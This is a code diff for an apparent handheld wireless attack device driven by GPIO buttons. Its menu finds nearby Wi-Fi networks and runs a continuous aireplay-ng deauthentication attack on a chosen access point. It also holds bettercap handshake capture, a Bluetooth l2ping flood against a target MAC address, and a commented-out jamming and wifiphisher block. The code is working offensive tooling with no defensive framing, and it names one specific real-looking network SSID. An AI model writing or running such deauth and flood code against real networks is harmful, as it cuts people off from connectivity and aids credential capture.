@@ -16,6 +16,7 @@ from lib.mojstd import *
 
 scroll_offset = 0
 max_visible_options = 7
+Exit = "<---------Exit--------->"
 
 #@functools.lru_cache(maxsize=236)
 def draw_menu(selected_index):
@@ -126,20 +127,20 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                if selected_option == "Handshakes":    
+                                if selected_option == "Handshakes":
                                     wifi_info().main()
                                     menu_options = []
                                     selected_index = 0
 
-                                    with open("wifiinfo.json", mode="r") as a: 
+                                    with open("wifiinfo.json", mode="r") as a:
                                         data = json.load(a)
 
                                     dictdionary = {}
 
                                     for item in data:
-                                            menu_options.append(item['ssid'])                
+                                            menu_options.append(item['ssid'])
                                             dictdionary[item['ssid']] = item['bssid']
-                                        
+
                                     while True:
                                             draw_menu(selected_index)
                                             if GPIO.input(KEY_UP_PIN) == 0:
@@ -201,7 +202,7 @@ while True:
                                                     #
                                                     with open("output.txt", 'a') as file:
                                                         file.write(bettercap_process.stdout.readline())
-                                                    
+
 
                                                     #show_message(i, 1)
 
@@ -222,74 +223,99 @@ while True:
                                                     show_message("retring...")
                                                     break
                                         #break
-                                
+
                                 elif selected_option == "Deauth all":
                                     wifi_info().main()
                                     menu_options = []
                                     selected_index = 0
 
-                                    with open("wifiinfo.json", mode="r") as a: 
+                                    with open("wifiinfo.json", mode="r") as a:
                                         data = json.load(a)
 
                                     dictdionary = {}
 
                                     for item in data:
-                                            menu_options.append(item['ssid'])                
+                                            menu_options.append(item['ssid'])
                                             dictdionary[item['ssid']] = item['bssid']
                                             dictdionary[item['bssid']] = item['chan']
-                                    print(dictdionary)
                                     print(dictdionary['Vodafone-34821617'])
-                                        
+                                    menu_options.append(Exit)
+                                    show_message("Loading...")
                                     while True:
-                                            draw_menu(selected_index)
-                                            if GPIO.input(KEY_UP_PIN) == 0:
+                                            #show_message("Loading...", 1)
+                                        draw_menu(selected_index)
+                                        if GPIO.input(KEY_UP_PIN) == 0:
                                                 selected_index = (selected_index - 1) % len(menu_options)
                                                 draw_menu(selected_index)
                                                 time.sleep(0.3)
 
-                                            elif GPIO.input(KEY_DOWN_PIN) == 0:
+                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                 selected_index = (selected_index + 1) % len(menu_options)
                                                 draw_menu(selected_index)
                                                 time.sleep(0.3)
 
-                                            elif GPIO.input(KEY_PRESS_PIN) == 0:
+                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                 selected_option = menu_options[selected_index]
+                                                if selected_option == Exit:
+                                                    show_message("Retring...")
+                                                    break
                                                 selected_bssid = dictdionary[selected_option]
                                                 selected_chan = dictdionary[selected_bssid]
                                                 print("info: "+selected_option+" "+selected_bssid+" "+str(selected_chan))
+
+
+
 
 
                                                 show_message("Deauth starting...")
 
                                                 os.system("sudo iw wlan0 interface add mon0 type monitor")
                                                 os.system("sudo airmon-ng start mon0")
-                                                os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
-
+                                                time.sleep(0.5)
                                                 show_message("mon0 interface created", 1)
-                                                os.system("sudo iwconfig wlan0 mode monitor")
-
+                                                time.sleep(0.5)
                                                 show_message("Wait please...", 1)
                                                 time.sleep(2)
-                                                
-                                                #os.system(f"sudo iwconfig mon0 channel {str(selected_chan)}")
-                                                show_message(f"mon0 --> channel {selected_chan}")
 
-                                                times = '0'
-                                                
-                                                if times == '0':
-                                                    while True:
-                                                        deauthall = subprocess.run(['sudo', 'aireplay-ng', '--deauth', times, '-a', selected_bssid, 'mon0'], text=True, capture_output=True)
-                                                        #os.system(f"sudo airplay-ng --deauth 0 -a {selected_bssid} mon0")
-                                                        show_message("Deauth full started")
-                                                        with open("output1.txt", 'a') as file:
-                                                            file.write(deauthall.stdout)
-                                                            file.write(deauthall)
+                                                subprocess.run(['sudo', 'iwconfig', 'mon0', 'channel', str(selected_chan)], text=True, capture_output=True)
+                                                time.sleep(2)
+                                                show_message(f"mon0 --> channel {str(selected_chan)}")
+
+                                                time.sleep(1)
+
+                                                show_message("Loading...")
+                                                time.sleep(3)
+                                                show_message("Press Key_3 to go back...")
+                                                command = ['sudo', 'aireplay-ng','--deauth', '0', '-a', selected_bssid, 'mon0']
+                                                deauthall = subprocess.run(command, text=True, capture_output=True)
+
+
+
+                                                if deauthall.returncode != 0:
+                                                            show_message(f"Error: {deauthall.stderr}", 2)
+                                                            with open("output1.txt", 'a') as file:
+                                                                command_string = ' '.join(command)
+                                                                file.write(f"command: {command_string}\n")
+                                                                file.write(deauthall.stderr)
+                                                                file.write(deauthall.stdout)
+                                                                os.system("sudo iwconfig wlan0 mode managed")
+                                                                os.system("sudo systemctl NetworkManager restart")
+                                                                time.sleep(1)
+                                                                show_message("Restarting wlan0...",2)
+                                                                break
+
+
+
+
                                                 else:
-                                                    for i in range(0, times):
-                                                        deauthall = subprocess.run(['sudo', 'aireplay-ng', '--deauth', times, '-a', selected_bssid, 'mon0'], text=True, capture_output=True)
-                                                        show_message("Deauth full started")
-                                                    show_message("DEAUTH COMPLETE!",2)
-                                                    break
+                                                            with open("output1.txt", 'a') as file:
+                                                                command_string = ' '.join(command)
+                                                                file.write(f"command: {command_string}\n")
+                                                                file.write(deauthall.stdout)
+                                        break
+
+
+
 
 
 
@@ -310,7 +336,7 @@ while True:
                                     show_message("JAMMING STARTED",5)
                                     for i in range(0, 5000):
                                         os.system("aireplay-ng -a ")
-                                    
+
                                     with open("wifip_output.txt" , 'a') as file:
                                         file.write(wifiphisher.stdout)
                                         show_message(wifiphisher.stdout)"""
@@ -373,7 +399,8 @@ while True:
                                 mac = str(selected_option)
                                 print(mac)
                                 def DOS(a):
-                                        #os.system("sudo " + "hciconfig " + "hci0 " + "up")
+                                        os.system("sudo " + "hciconfig " + "hci0 " + "up")
+                                        time.sleep(1)
                                         #os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)
                                         subprocess.run(['sudo', 'l2ping', '-i', 'hci0', '-s', '600', '-f', a], capture_output=True, text=True)
                                         #print(a)
